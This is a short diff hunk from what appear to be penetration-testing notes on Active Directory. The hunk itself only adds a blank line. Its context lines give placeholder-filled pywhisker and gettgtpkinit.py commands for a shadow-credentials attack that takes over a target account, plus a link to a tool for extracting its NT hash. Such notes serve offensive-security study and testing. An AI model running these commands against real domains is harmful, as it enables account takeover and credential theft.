@@ -28,6 +28,7 @@ ____________________________________________________
      https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
 
 
+
 ` pywhisker -d "< domain >" -u "< user you control>" -p "< password >" --target "<target user>" --action "add" `
 
 ` < kerberos sync clock > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache `
